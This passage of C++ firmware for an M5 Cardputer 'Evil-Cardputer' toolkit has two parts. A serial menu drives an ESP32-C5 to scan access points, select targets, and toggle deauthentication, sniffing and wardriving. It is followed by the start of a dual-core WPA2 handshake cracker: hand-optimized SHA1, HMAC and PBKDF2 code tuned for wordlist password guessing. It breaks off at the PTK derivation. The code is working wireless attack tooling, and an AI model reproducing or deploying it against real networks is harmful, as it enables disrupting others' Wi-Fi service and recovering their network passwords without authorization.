  M5.Display.display();
}

void c5_drawRxBlink() {
  const uint32_t BLINK_MS = 120;
  int x = M5.Display.width() - 6;
  int y = 2;

  if (millis() - g_c5_lastRxBlink < BLINK_MS) {
    M5.Display.fillCircle(x, y, 2, TFT_GREEN);
  } else {
    M5.Display.fillCircle(x, y, 2, menuBackgroundColor);
  }
}


// ===================== UART init/stop =====================
void c5_uartBegin() {
  if (g_c5_uart_on) return;

  // Coupe GPS (GPIO RX partagé suivant les configs)
  cardgps.end();

  uartAuto.setRxBufferSize(UART_RX_BUF);

  // Détection carte (Cardputer vs ADV)
  if (M5.getBoard() == m5::board_t::board_M5CardputerADV) {
    C5RxPin = 13;
    C5TxPin = 15;
    uartAuto.begin(C5_BAUD, SERIAL_8N1, C5RxPin, C5TxPin);
    Serial.println("[C5] Detected: Cardputer-ADV (UART RX=13 TX=15)");
  } else {
    C5RxPin = 1;
    C5TxPin = 2;
    uartAuto.begin(C5_BAUD, SERIAL_8N1, C5RxPin, C5TxPin);
    Serial.println("[C5] Detected: Cardputer (UART RX=1 TX=2)");
  }

  g_c5_uart_on = true;
  g_c5_rxpos = 0;

  c5_uartFlushInput();
  Serial.println("[C5] UART started");
}

void c5_uartEnd() {
  if (!g_c5_uart_on) return;

  uartAuto.end();
  g_c5_uart_on = false;

  // Restore GPS (AWOK 21/22)
  cardgps.begin(baudrate_gps, SERIAL_8N1, AWOK_GPS_RX, AWOK_GPS_TX);

  Serial.println("[C5] UART stopped, GPS restored");
}


// ===================== Band chooser =====================
int c5_chooseBandMenu() {
  const char* items[] = { "ALL", "2G", "5G" };
  const int n = 3;
  int idx = 0;
  if (!strcmp(g_c5_band, "2G")) idx = 1;
  if (!strcmp(g_c5_band, "5G")) idx = 2;

  enterDebounce();
  bool need = true;

  while (true) {
    M5.update(); cardUpdate();

    if (need) {
      M5.Display.clear();
      M5.Display.setTextSize(1.5);
      M5.Display.setCursor(0, 0);
      M5.Display.setTextColor(menuTextFocusedColor, menuBackgroundColor);
      M5.Display.println("ESP32C5 - BAND");
      M5.Display.println("----------------");

      for (int i = 0; i < n; ++i) {
        if (i == idx) {
          M5.Display.fillRect(0, 30 + i * 16, M5.Display.width(), 16, menuSelectedBackgroundColor);
          M5.Display.setTextColor(menuTextFocusedColor, menuSelectedBackgroundColor);
        } else {
          M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
        }
        M5.Display.setCursor(0, 30 + i * 16);
        M5.Display.println(items[i]);
      }

      c5_uiFooter("^/v ;/.  ENTER  BACKSPACE");
      need = false;
    }

    if (kp(';')) { idx = (idx - 1 + n) % n; need = true; delay(150); }
    if (kp('.')) { idx = (idx + 1) % n; need = true; delay(150); }
    if (kp(KEY_ENTER)) return idx;
    if (kp(KEY_BACKSPACE)) return -1;

    delay(10);
  }
}

// ===================== Scan/List capture =====================
bool c5_runScriptListCommand(const char* cmdLine) {
  g_c5_ap_count = 0;
  g_c5_ap_cursor = 0;
  memset(g_c5_ap_selected, 0, sizeof(g_c5_ap_selected));
  
  g_c5_cap = C5CAP_APLIST;
  g_c5_seenHeader = false;
  g_c5_lastUsefulRx = 0;
  g_c5_lastAnyRx = 0;

  c5_uartFlushInput();

  c5_uiHeader(cmdLine);
  c5_uiFooter("Running... BACKSPACE cancel");
  c5_sendScriptLine(cmdLine);

  const uint32_t t0 = millis();
  uint32_t lastUi = 0;

  while (millis() - t0 < C5_GLOBAL_TIMEOUT_MS) {
    M5.update();
    cardUpdate();
    c5_poll_uart();
    c5_drawRxBlink();

    if (kp(KEY_BACKSPACE)) {
      backDebounce();
      break;
    }

    if (millis() - lastUi > 200) {
      lastUi = millis();
      c5_uiHeader(cmdLine);
      M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
      M5.Display.printf("AP:%u\n", (unsigned)g_c5_ap_count);
      M5.Display.println(g_c5_seenHeader ? "Parsing: OK" : "Parsing: ...");
      c5_uiFooter("Wait end... BACKSPACE");
    }

    if (g_c5_ap_count > 0 && g_c5_lastUsefulRx > 0) {
      if (millis() - g_c5_lastUsefulRx > C5_IDLE_DONE_MS) break;
    }

    delay(5);
  }

  g_c5_cap = C5CAP_NONE;

  c5_uiHeader("DONE");
  M5.Display.setTextColor(menuTextFocusedColor, menuBackgroundColor);
  M5.Display.printf("AP received: %u\n", (unsigned)g_c5_ap_count);
  c5_uiFooter("ENTER: view list  BACKSPACE: menu");

  while (true) {
    M5.update();
    cardUpdate();
    if (kp(KEY_ENTER)) { enterDebounce(); return true; }
    if (kp(KEY_BACKSPACE)) { backDebounce(); return true; }
    delay(10);
  }
}

// ===================== AP list UI + TARGET INDEX =====================
void c5_viewApListAndSelectTarget() {
  enterDebounce();
  bool need = true;

  while (true) {
    M5.update(); 
    cardUpdate();
    c5_poll_uart();

    if (need) {
      M5.Display.clear();

      // En-tête simplifié et fin
      M5.Display.setTextSize(1.5);
      M5.Display.setCursor(0, 0);
      M5.Display.setTextColor(menuTextFocusedColor, menuBackgroundColor);
      M5.Display.println("AP LIST");

      // Zone d’affichage des AP
      const int startY = 14;
      const int lineH  = 14;
      const int maxLines = (M5.Display.height() - startY - 10) / lineH;

      int top = g_c5_ap_cursor - (maxLines / 2);
      if (top < 0) top = 0;
      if (top > (int)g_c5_ap_count - maxLines)
        top = max(0, (int)g_c5_ap_count - maxLines);

      for (int i = 0; i < maxLines; ++i) {
        int idx = top + i;
        if (idx >= (int)g_c5_ap_count) break;

        int y = startY + i * lineH;

        bool sel = g_c5_ap_selected[idx];
        bool cur = (idx == g_c5_ap_cursor);

        uint32_t bg = cur ? menuSelectedBackgroundColor : menuBackgroundColor;
        uint32_t fg = cur ? menuTextFocusedColor : menuTextUnFocusedColor;

        if (sel) {
          bg = TFT_DARKGREEN;
          fg = TFT_WHITE;
        }
        if (cur && sel) {
          bg = TFT_GREEN;
          fg = TFT_BLACK;
        }

        M5.Display.fillRect(0, y, M5.Display.width(), lineH, bg);
        M5.Display.setTextColor(fg, bg);
        M5.Display.setCursor(0, y);

        char row[96];
        snprintf(row, sizeof(row),
          "%c%u CH%u %ddB %.20s",
          sel ? '*' : ' ',
          (unsigned)g_c5_ap[idx].idx,
          (unsigned)g_c5_ap[idx].ch,
          (int)g_c5_ap[idx].rssi,
          g_c5_ap[idx].ssid[0] ? g_c5_ap[idx].ssid : "(hidden)");
        M5.Display.print(row);
      }

      c5_uiFooter(";/.:move  /=select  ENTER=send  BK");
      need = false;
    }

    // navigation
    if (kp(';')) {
      if (g_c5_ap_cursor > 0) g_c5_ap_cursor--;
      need = true;
      delay(120);
    }
    if (kp('.')) {
      if (g_c5_ap_cursor + 1 < (int)g_c5_ap_count)
        g_c5_ap_cursor++;
      need = true;
      delay(120);
    }

    // toggle sélection avec '/'
    if (kp('/')) {
      g_c5_ap_selected[g_c5_ap_cursor] =
        !g_c5_ap_selected[g_c5_ap_cursor];
      need = true;
      delay(180);
    }

    // quitter
    if (kp(KEY_BACKSPACE)) {
      backDebounce();
      return;
    }

    // envoyer TARGET INDEX
    if (kp(KEY_ENTER)) {
      enterDebounce();

      char payload[120];
      payload[0] = 0;

      bool first = true;
      for (int i = 0; i < g_c5_ap_count; ++i) {
        if (g_c5_ap_selected[i]) {
          char tmp[12];
          snprintf(tmp, sizeof(tmp), "%s%u",
                   first ? "" : ",",
                   (unsigned)g_c5_ap[i].idx);
          strncat(payload, tmp, sizeof(payload) - strlen(payload) - 1);
          first = false;
        }
      }

      // fallback : aucun sélectionné → curseur seul
      if (first) {
        snprintf(payload, sizeof(payload), "%u",
                 (unsigned)g_c5_ap[g_c5_ap_cursor].idx);
      }

      char cmd[160];
      snprintf(cmd, sizeof(cmd), "TARGET INDEX %s", payload);

      c5_uiHeader("TARGET INDEX");
      M5.Display.setTextColor(menuTextFocusedColor, menuBackgroundColor);
      M5.Display.println(cmd);
      c5_uiFooter("Sending...");

      c5_sendScriptLine(cmd);

      delay(400);
      backDebounce();
      need = true;
    }

    delay(5);
  }
}


// ===================== Raw monitor =====================
void c5_rawMonitor() {
  // ================= CONFIG AFFICHAGE =================
  const uint8_t MAX_LINES = 15;      // nombre de lignes visibles
  const uint8_t LINE_LEN  = 41;      // largeur ligne (40 + '\0')
  const uint8_t HEADER_H  = 16;      // hauteur header en pixels
  const uint8_t LINE_H    = 11;      // hauteur ligne texte size=1

  char lines[MAX_LINES][LINE_LEN];
  uint8_t head = 0;

  for (int i = 0; i < MAX_LINES; ++i) lines[i][0] = 0;
  g_c5_rxpos = 0;

  // ================= HEADER =================
  M5.Display.clear();
  M5.Display.setTextSize(1);
  M5.Display.setCursor(0, 0);
  M5.Display.setTextColor(menuTextFocusedColor, menuBackgroundColor);
  M5.Display.println("C5 RAW MONITOR");
  M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
  M5.Display.println("` or BK to exit");
  M5.Display.display();

  uint32_t lastDraw = 0;

  // ================= LOOP =================
  while (true) {
    M5.update();
    cardUpdate();

    // ---------- UART RX ----------
    while (uartAuto.available()) {
      char c = (char)uartAuto.read();
      if (c == '\r') continue;

      if (c == '\n') {
        g_c5_rxline[g_c5_rxpos] = 0;
        if (g_c5_rxpos > 0) {
          strncpy(lines[head], g_c5_rxline, LINE_LEN - 1);
          lines[head][LINE_LEN - 1] = 0;
          head = (head + 1) % MAX_LINES;
          Serial.printf("[C5][MON] %s\n", g_c5_rxline);
        }
        g_c5_rxpos = 0;
      } else if (isprint((uint8_t)c) || c == '\t') {
        if (g_c5_rxpos + 1 < sizeof(g_c5_rxline)) {
          g_c5_rxline[g_c5_rxpos++] = c;
        } else {
          g_c5_rxpos = 0; // overflow protection
        }
      }
    }

    // ---------- EXIT ----------
    if (kp('`') ||
        kp(KEY_BACKSPACE)) {
      backDebounce();
      return;
    }

    // ---------- DRAW ----------
    if (millis() - lastDraw > 120) {
      lastDraw = millis();

      // clear zone sous le header
      M5.Display.fillRect(
        0,
        HEADER_H,
        M5.Display.width(),
        M5.Display.height() - HEADER_H,
        menuBackgroundColor
      );

      M5.Display.setCursor(0, HEADER_H);
      M5.Display.setTextSize(1);
      M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);

      for (int i = 0; i < MAX_LINES; ++i) {
        uint8_t idx = (head + i) % MAX_LINES;
        if (lines[idx][0]) {
          M5.Display.println(lines[idx]);
        }
      }

      M5.Display.display();
    }

    delay(5);
  }
}


void c5_promptAndSend(const char* title, const char* prefix) {
  String v = promptInput(title);
  v.trim();
  if (!v.length()) return;

  char cmd[180];
  snprintf(cmd, sizeof(cmd), "%s %s", prefix, v.c_str());
  c5_sendScriptLine(cmd);
}

void startESP32C5SerialMenu() {
  inMenu = false;
  enterDebounce();

  c5_uartBegin();

  c5_uiHeader("Checking ESP32C5");
  c5_uiFooter("sending STOP / HELP");
  delay(1000);
  if (!c5_checkDevicePresent()) {
    c5_uiHeader("ESP32C5 ERROR");
    M5.Display.setTextColor(TFT_RED, menuBackgroundColor);
    M5.Display.println("No response on UART");
    M5.Display.println("Check wiring / power");
    c5_uiFooter("BACKSPACE");
    delay(2500);
  }

  delay(80);
  c5_poll_uart();
  c5_uartFlushInput();

  const char* items[] = {
    "Start", "Stop", "Scan ALL", "Scan (single)", "List",
    "Band (ALL/2G/5G)", "Deauth toggle",
    "Ward toggle", "Ward history (ms)",
    "Sniff toggle", "Sniff timeout (ms)",
    "Target SSID", "Target BSSID", "Target INDEX (manual)", "Target clear",
    "Chan SET", "Chan ADD", "Chan RESET", "Chan CLEAR", "Chan LIST",
    "Interval (ms)", "History (ms)", "Info", "Config", "Help",
    "Send custom CMD", "Raw monitor", "Back to menu"
  };

  const int itemCount = sizeof(items) / sizeof(items[0]);
  int index = 0;
  bool need = true;

  while (true) {
    M5.update();
    cardUpdate();
    c5_poll_uart();
    c5_drawRxBlink();
    if (need) {
      M5.Display.clear();

      // 🔹 Infos en haut plus petites
      M5.Display.setTextSize(1);
      M5.Display.setCursor(0, 0);
      M5.Display.setTextColor(menuTextFocusedColor, menuBackgroundColor);
      M5.Display.println("ESP32C5 Toolkit");
      M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
      M5.Display.printf("Band:%s  Deauth:%s  AP:%u\n", g_c5_band,
                        g_c5_deauth_on ? "ON" : "OFF", (unsigned)g_c5_ap_count);
      M5.Display.printf("UART RX%d TX%d\n", C5RxPin, C5TxPin);

      // 🔹 Menu principal plus grand
      const int startY = 30;      // zone plus basse
      const int lineH = 14;       // hauteur de ligne plus grande
      const int maxLines = (M5.Display.height() - startY - 12) / lineH;
      int winLines = maxLines < 4 ? 4 : maxLines;

      int top = index - winLines / 2;
      if (top < 0) top = 0;
      if (top > itemCount - winLines) top = max(0, itemCount - winLines);

      for (int i = 0; i < winLines; ++i) {
        int it = top + i;
        if (it >= itemCount) break;

        int y = startY + i * lineH;
        if (it == index) {
          M5.Display.fillRect(0, y, M5.Display.width(), lineH, menuSelectedBackgroundColor);
          M5.Display.setTextColor(menuTextFocusedColor, menuSelectedBackgroundColor);
        } else {
          M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
        }
        M5.Display.setTextSize(1.5);
        M5.Display.setCursor(4, y);
        M5.Display.print(items[it]);
      }

      c5_uiFooter("^/v ;/.  ENTER  BACKSPACE");
      need = false;
    }

    // ======== NAVIGATION ========
    if (kp(';')) {
      index = (index - 1 + itemCount) % itemCount;
      need = true;
      delay(140);
    }
    if (kp('.')) {
      index = (index + 1) % itemCount;
      need = true;
      delay(140);
    }

    if (kp(KEY_BACKSPACE)) {
      backDebounce();
      break;
    }

    // ======== ACTION ========
    if (kp(KEY_ENTER)) {
      enterDebounce();

      auto feedback = [&](const char* title, const char* msg) {
        c5_uiHeader(title);
        M5.Display.setTextColor(menuTextFocusedColor, menuBackgroundColor);
        M5.Display.println(msg);
        c5_uiFooter("BACKSPACE");
        while (!kp(KEY_BACKSPACE)) {
          M5.update(); cardUpdate();
          c5_poll_uart();
          delay(10);
        }
        backDebounce();
      };

      switch (index) {
        case 0: c5_sendScriptLine("START"); c5_rawMonitor(); break;
        case 1: c5_sendScriptLine("STOP"); feedback("STOP", "Attack stopped"); break;
        case 2: c5_runScriptListCommand("SCAN ALL"); if (g_c5_ap_count) c5_viewApListAndSelectTarget(); break;
        case 3: c5_runScriptListCommand("SCAN"); if (g_c5_ap_count) c5_viewApListAndSelectTarget(); break;
        case 4: c5_runScriptListCommand("LIST"); if (g_c5_ap_count) c5_viewApListAndSelectTarget(); break;
        case 5: {
          int b = c5_chooseBandMenu();
          if (b >= 0) {
            const char* m = (b==0)?"ALL":(b==1)?"2G":"5G";
            char cmd[16]; snprintf(cmd, sizeof(cmd), "BAND %s", m);
            c5_sendScriptLine(cmd);
            strncpy(g_c5_band, m, sizeof(g_c5_band)-1);
            feedback("BAND", m);
          }
        } break;
        case 6:
          g_c5_deauth_on = !g_c5_deauth_on;
          c5_sendScriptLine(g_c5_deauth_on ? "DEAUTH ON" : "DEAUTH OFF");
          feedback("DEAUTH", g_c5_deauth_on ? "Enabled" : "Disabled");
          break;

        case 7:
          g_c5_ward_on = !g_c5_ward_on;
          c5_sendScriptLine(g_c5_ward_on ? "WARD ON" : "WARD OFF");
          // Ward ON auto-disables DEAUTH+SNIFF on the slave; mirror that locally.
          if (g_c5_ward_on) { g_c5_deauth_on = false; g_c5_sniff_on = false; }
          feedback("WARD", g_c5_ward_on ? "Enabled" : "Disabled");
          break;
        case 8:  c5_promptAndSend("WARD HISTORY ms", "WARD HISTORY"); break;
        case 9:
          g_c5_sniff_on = !g_c5_sniff_on;
          c5_sendScriptLine(g_c5_sniff_on ? "SNIFF ON" : "SNIFF OFF");
          feedback("SNIFF", g_c5_sniff_on ? "Enabled" : "Disabled");
          break;
        case 10: c5_promptAndSend("SNIFF_TIMEOUT ms", "SNIFF_TIMEOUT"); break;

        case 11:  c5_promptAndSend("TARGET SSID", "TARGET SSID"); break;
        case 12:  c5_promptAndSend("TARGET BSSID", "TARGET BSSID"); break;
        case 13:  c5_promptAndSend("TARGET INDEX", "TARGET INDEX"); break;
        case 14: c5_sendScriptLine("TARGET CLEAR"); feedback("TARGET", "Cleared"); break;

        case 15: c5_promptAndSend("CHAN SET", "CHAN SET"); break;
        case 16: c5_promptAndSend("CHAN ADD", "CHAN ADD"); break;
        case 17: c5_sendScriptLine("CHAN RESET"); feedback("CHANNELS", "Reset"); break;
        case 18: c5_sendScriptLine("CHAN CLEAR"); feedback("CHANNELS", "Cleared"); break;
        case 19: c5_sendScriptLine("CHAN LIST"); c5_rawMonitor(); break;

        case 20: c5_promptAndSend("INTERVAL ms", "INTERVAL"); break;
        case 21: c5_promptAndSend("HISTORY ms", "HISTORY"); break;
        case 22: c5_sendScriptLine("INFO"); c5_rawMonitor(); break;
        case 23: c5_sendScriptLine("CONFIG"); c5_rawMonitor(); break;
        case 24: c5_sendScriptLine("HELP"); c5_rawMonitor(); break;
        case 25: c5_promptAndSend("Custom CMD", ""); break;
        case 26: c5_rawMonitor(); break;
        case 27: backDebounce(); goto exit_menu;
      }

      need = true;
    }

    enterDebounce();
    delay(10);
  }

exit_menu:
  c5_uartEnd();
  waitAndReturnToMenu("Back to menu");
}

























/* ============================================================
   WPA2 HANDSHAKE AUDIT + DUAL-CORE CRACKER (EVIL-CARDPUTER)
   - Custom software SHA1 in IRAM (no mbedtls mutex bottleneck)
   - Dual-core FreeRTOS producer-consumer
   - Pre-computed HMAC pads + specialized 20-byte path
   - Buffered wordlist reader (4KB SRAM, no PSRAM)
   - ~13 pwd/s on ESP32-S3 (vs ~2 pwd/s with mbedtls)
   ============================================================ */

#include "mbedtls/md.h"
#include "mbedtls/pkcs5.h"

/* ---- Tuning ---- */
#define EVIL_WPA2_MAX_PCAPREC 2048
#define CRACK_YIELD_MS          2   // thermal throttle: each ms costs ~1.4% speed
#define CRACK_UI_INTERVAL_MS 1000   // LCD refresh every 1s (not per password)
#define CRACK_WORDLIST_BUFSZ 4096   // 4KB buffer (no PSRAM on Cardputer)

evil_wpa2_hs_t g_wpa2;

/* =================================================================
   SOFTWARE SHA1 — IRAM, O3, no FreeRTOS mutex
   Hardware SHA peripheral has a mutex that serializes dual-core.
   This custom impl runs ~1.8x faster on dual-core ESP32-S3.
   ================================================================= */

#define SHA1_ROL(x, n) (((x) << (n)) | ((x) >> (32 - (n))))
#define SHA1_BLK(i) \
  (blk[i & 15] = SHA1_ROL(blk[(i+13)&15] ^ blk[(i+8)&15] ^ blk[(i+2)&15] ^ blk[i&15], 1))

#define R0(v,w,x,y,z,i) z+=((w&(x^y))^y)+blk[i]+0x5A827999u+SHA1_ROL(v,5);w=SHA1_ROL(w,30)
#define R1(v,w,x,y,z,i) z+=((w&(x^y))^y)+SHA1_BLK(i)+0x5A827999u+SHA1_ROL(v,5);w=SHA1_ROL(w,30)
#define R2(v,w,x,y,z,i) z+=(w^x^y)+SHA1_BLK(i)+0x6ED9EBA1u+SHA1_ROL(v,5);w=SHA1_ROL(w,30)
#define R3(v,w,x,y,z,i) z+=(((w|x)&y)|(w&x))+SHA1_BLK(i)+0x8F1BBCDCu+SHA1_ROL(v,5);w=SHA1_ROL(w,30)
#define R4(v,w,x,y,z,i) z+=(w^x^y)+SHA1_BLK(i)+0xCA62C1D6u+SHA1_ROL(v,5);w=SHA1_ROL(w,30)

#define SHA1_80_ROUNDS() \
  R0(a,b,c,d,e, 0);R0(e,a,b,c,d, 1);R0(d,e,a,b,c, 2);R0(c,d,e,a,b, 3); \
  R0(b,c,d,e,a, 4);R0(a,b,c,d,e, 5);R0(e,a,b,c,d, 6);R0(d,e,a,b,c, 7); \
  R0(c,d,e,a,b, 8);R0(b,c,d,e,a, 9);R0(a,b,c,d,e,10);R0(e,a,b,c,d,11); \
  R0(d,e,a,b,c,12);R0(c,d,e,a,b,13);R0(b,c,d,e,a,14);R0(a,b,c,d,e,15); \
  R1(e,a,b,c,d,16);R1(d,e,a,b,c,17);R1(c,d,e,a,b,18);R1(b,c,d,e,a,19); \
  R2(a,b,c,d,e,20);R2(e,a,b,c,d,21);R2(d,e,a,b,c,22);R2(c,d,e,a,b,23); \
  R2(b,c,d,e,a,24);R2(a,b,c,d,e,25);R2(e,a,b,c,d,26);R2(d,e,a,b,c,27); \
  R2(c,d,e,a,b,28);R2(b,c,d,e,a,29);R2(a,b,c,d,e,30);R2(e,a,b,c,d,31); \
  R2(d,e,a,b,c,32);R2(c,d,e,a,b,33);R2(b,c,d,e,a,34);R2(a,b,c,d,e,35); \
  R2(e,a,b,c,d,36);R2(d,e,a,b,c,37);R2(c,d,e,a,b,38);R2(b,c,d,e,a,39); \
  R3(a,b,c,d,e,40);R3(e,a,b,c,d,41);R3(d,e,a,b,c,42);R3(c,d,e,a,b,43); \
  R3(b,c,d,e,a,44);R3(a,b,c,d,e,45);R3(e,a,b,c,d,46);R3(d,e,a,b,c,47); \
  R3(c,d,e,a,b,48);R3(b,c,d,e,a,49);R3(a,b,c,d,e,50);R3(e,a,b,c,d,51); \
  R3(d,e,a,b,c,52);R3(c,d,e,a,b,53);R3(b,c,d,e,a,54);R3(a,b,c,d,e,55); \
  R3(e,a,b,c,d,56);R3(d,e,a,b,c,57);R3(c,d,e,a,b,58);R3(b,c,d,e,a,59); \
  R4(a,b,c,d,e,60);R4(e,a,b,c,d,61);R4(d,e,a,b,c,62);R4(c,d,e,a,b,63); \
  R4(b,c,d,e,a,64);R4(a,b,c,d,e,65);R4(e,a,b,c,d,66);R4(d,e,a,b,c,67); \
  R4(c,d,e,a,b,68);R4(b,c,d,e,a,69);R4(a,b,c,d,e,70);R4(e,a,b,c,d,71); \
  R4(d,e,a,b,c,72);R4(c,d,e,a,b,73);R4(b,c,d,e,a,74);R4(a,b,c,d,e,75); \
  R4(e,a,b,c,d,76);R4(d,e,a,b,c,77);R4(c,d,e,a,b,78);R4(b,c,d,e,a,79)

/* General-purpose SHA1 transform (64-byte block) */
__attribute__((optimize("O3"), hot))
void evil_sha1_transform(uint32_t state[5], const uint8_t buf[64]) {
  uint32_t a=state[0], b=state[1], c=state[2], d=state[3], e=state[4];
  uint32_t blk[16], tmp;
  for (int i=0; i<16; i++) { memcpy(&tmp, buf+i*4, 4); blk[i]=__builtin_bswap32(tmp); }
  SHA1_80_ROUNDS();
  state[0]+=a; state[1]+=b; state[2]+=c; state[3]+=d; state[4]+=e;
}

/* Specialized: exactly 20 bytes input with SHA1 padding pre-baked.
   Hot path: 8190 of 8192 PBKDF2 HMAC calls use 20-byte input. */
__attribute__((optimize("O3"), hot))
void evil_sha1_transform_20b(uint32_t state[5], const uint8_t data[20]) {
  uint32_t a=state[0], b=state[1], c=state[2], d=state[3], e=state[4];
  uint32_t blk[16], tmp;
  memcpy(&tmp, data+ 0, 4); blk[0]=__builtin_bswap32(tmp);
  memcpy(&tmp, data+ 4, 4); blk[1]=__builtin_bswap32(tmp);
  memcpy(&tmp, data+ 8, 4); blk[2]=__builtin_bswap32(tmp);
  memcpy(&tmp, data+12, 4); blk[3]=__builtin_bswap32(tmp);
  memcpy(&tmp, data+16, 4); blk[4]=__builtin_bswap32(tmp);
  blk[5]=0x80000000u;
  blk[6]=blk[7]=blk[8]=blk[9]=blk[10]=blk[11]=blk[12]=blk[13]=0;
  blk[14]=0;
  blk[15]=0x000002A0u; // (64+20)*8 = 672 = 0x2A0
  SHA1_80_ROUNDS();
  state[0]+=a; state[1]+=b; state[2]+=c; state[3]+=d; state[4]+=e;
}

/* Specialized: 20 bytes as uint32_t words (already big-endian) */
__attribute__((optimize("O3"), hot))
void evil_sha1_transform_20w(uint32_t state[5], const uint32_t words[5]) {
  uint32_t a=state[0], b=state[1], c=state[2], d=state[3], e=state[4];
  uint32_t blk[16];
  blk[0]=words[0]; blk[1]=words[1]; blk[2]=words[2]; blk[3]=words[3]; blk[4]=words[4];
  blk[5]=0x80000000u;
  blk[6]=blk[7]=blk[8]=blk[9]=blk[10]=blk[11]=blk[12]=blk[13]=0;
  blk[14]=0;
  blk[15]=0x000002A0u;
  SHA1_80_ROUNDS();
  state[0]+=a; state[1]+=b; state[2]+=c; state[3]+=d; state[4]+=e;
}

inline void evil_sha1_extract(const uint32_t state[5], uint8_t digest[20]) {
  for (int i=0; i<5; i++) { uint32_t s=__builtin_bswap32(state[i]); memcpy(digest+i*4, &s, 4); }
}

void evil_sha1_init(EvilSha1Ctx &ctx) {
  ctx.state[0]=0x67452301u; ctx.state[1]=0xEFCDAB89u;
  ctx.state[2]=0x98BADCFEu; ctx.state[3]=0x10325476u;
  ctx.state[4]=0xC3D2E1F0u;
  ctx.count[0]=ctx.count[1]=0;
}

void evil_sha1_update(EvilSha1Ctx &ctx, const uint8_t *data, size_t len) {
  uint32_t j = (ctx.count[0] >> 3) & 63;
  if ((ctx.count[0] += (uint32_t)(len << 3)) < (uint32_t)(len << 3)) ctx.count[1]++;
  ctx.count[1] += (uint32_t)(len >> 29);
  if (j + len > 63) {
    size_t i = 64 - j;
    memcpy(ctx.buf + j, data, i);
    evil_sha1_transform(ctx.state, ctx.buf);
    for (; i + 63 < len; i += 64) evil_sha1_transform(ctx.state, data + i);
    j = 0;
    memcpy(ctx.buf, data + i, len - i);
  } else {
    memcpy(ctx.buf + j, data, len);
  }
}

void evil_sha1_final(EvilSha1Ctx &ctx, uint8_t digest[20]) {
  uint64_t total_bits = ((uint64_t)ctx.count[1] << 32) | ctx.count[0];
  uint32_t j = (ctx.count[0] >> 3) & 63;
  ctx.buf[j++] = 0x80;
  if (j > 56) { memset(ctx.buf+j, 0, 64-j); evil_sha1_transform(ctx.state, ctx.buf); j=0; }
  memset(ctx.buf+j, 0, 56-j);
  for (int i=0; i<8; i++) ctx.buf[56+i] = (uint8_t)(total_bits >> (56 - i*8));
  evil_sha1_transform(ctx.state, ctx.buf);
  evil_sha1_extract(ctx.state, digest);
}

/* =================================================================
   HMAC-SHA1 with pre-computed inner/outer pads
   ================================================================= */

void evil_hmac_precompute(const uint8_t *key, size_t klen, EvilHmacPre &out) {
  uint8_t k_ipad[64], k_opad[64];
  memset(k_ipad, 0x36, 64);
  memset(k_opad, 0x5C, 64);
  uint8_t hk[20];
  if (klen > 64) {
    EvilSha1Ctx t; evil_sha1_init(t);
    evil_sha1_update(t, key, klen);
    evil_sha1_final(t, hk);
    key = hk; klen = 20;
  }
  for (size_t i=0; i<klen; i++) { k_ipad[i] ^= key[i]; k_opad[i] ^= key[i]; }
  evil_sha1_init(out.inner); evil_sha1_update(out.inner, k_ipad, 64);
  evil_sha1_init(out.outer); evil_sha1_update(out.outer, k_opad, 64);
}

/* HMAC-SHA1 for 20-byte input (hot PBKDF2 path) */
__attribute__((optimize("O3"), hot))
void evil_hmac_sha1_20(const EvilHmacPre &pre, const uint8_t data[20], uint8_t out[20]) {
  uint32_t state[5];
  memcpy(state, pre.inner.state, 20);
  evil_sha1_transform_20b(state, data);
  uint32_t ih[5] = {state[0], state[1], state[2], state[3], state[4]};
  memcpy(state, pre.outer.state, 20);
  evil_sha1_transform_20w(state, ih);
  evil_sha1_extract(state, out);
}

/* HMAC-SHA1 for 20-byte input — word-level (no byte conversion) */
__attribute__((optimize("O3"), hot))
void evil_hmac_sha1_20w(const EvilHmacPre &pre, const uint32_t data[5], uint32_t out[5]) {
  uint32_t state[5];
  memcpy(state, pre.inner.state, 20);
  evil_sha1_transform_20w(state, data);
  uint32_t ih[5] = {state[0], state[1], state[2], state[3], state[4]};
  memcpy(state, pre.outer.state, 20);
  evil_sha1_transform_20w(state, ih);
  memcpy(out, state, 20);
}

/* Generic HMAC-SHA1 with precomputed pads (for first PBKDF2 iteration) */
void evil_hmac_sha1_pre(const EvilHmacPre &pre, const uint8_t *data, size_t dlen, uint8_t *out20) {
  uint8_t inner_hash[20];
  EvilSha1Ctx ctx = pre.inner;
  evil_sha1_update(ctx, data, dlen);
  evil_sha1_final(ctx, inner_hash);
  ctx = pre.outer;
  evil_sha1_update(ctx, inner_hash, 20);
  evil_sha1_final(ctx, out20);
}

/* =================================================================
   PBKDF2-HMAC-SHA1 (4096 iterations, 32 bytes output)
   ================================================================= */
__attribute__((optimize("O3"), hot))
void evil_pbkdf2(const EvilHmacPre &pre, const uint8_t *salt, size_t slen,
                 uint32_t iters, uint8_t out[32]) {
  uint8_t salt_int[40]; // max SSID 32 + 4
  memcpy(salt_int, salt, slen);

  uint8_t U8[20];
  uint32_t U[5], T[5];

  /* Block 1 (bytes 0-19 of PMK) */
  salt_int[slen]=0; salt_int[slen+1]=0; salt_int[slen+2]=0; salt_int[slen+3]=1;
  evil_hmac_sha1_pre(pre, salt_int, slen+4, U8);
  for (int i=0; i<5; i++) { uint32_t t; memcpy(&t, U8+i*4, 4); U[i]=__builtin_bswap32(t); }
  memcpy(T, U, 20);
  for (uint32_t i=1; i<iters; i++) {
    evil_hmac_sha1_20w(pre, U, U);
    T[0]^=U[0]; T[1]^=U[1]; T[2]^=U[2]; T[3]^=U[3]; T[4]^=U[4];
  }
  evil_sha1_extract(T, out);

  /* Block 2 (bytes 20-31 of PMK, only first 12 bytes used) */
  salt_int[slen+3]=2;
  evil_hmac_sha1_pre(pre, salt_int, slen+4, U8);
  for (int i=0; i<5; i++) { uint32_t t; memcpy(&t, U8+i*4, 4); U[i]=__builtin_bswap32(t); }
  memcpy(T, U, 20);
  for (uint32_t i=1; i<iters; i++) {
    evil_hmac_sha1_20w(pre, U, U);
    T[0]^=U[0]; T[1]^=U[1]; T[2]^=U[2]; T[3]^=U[3]; T[4]^=U[4];
  }
  evil_sha1_extract(T, out+20);
}

/* =================================================================
   PRF-512 (PTK derivation) + MIC verification
   ================================================================= */
void evil_prf512(const uint8_t pmk[32], const uint8_t *data, uint8_t ptk[64]) {
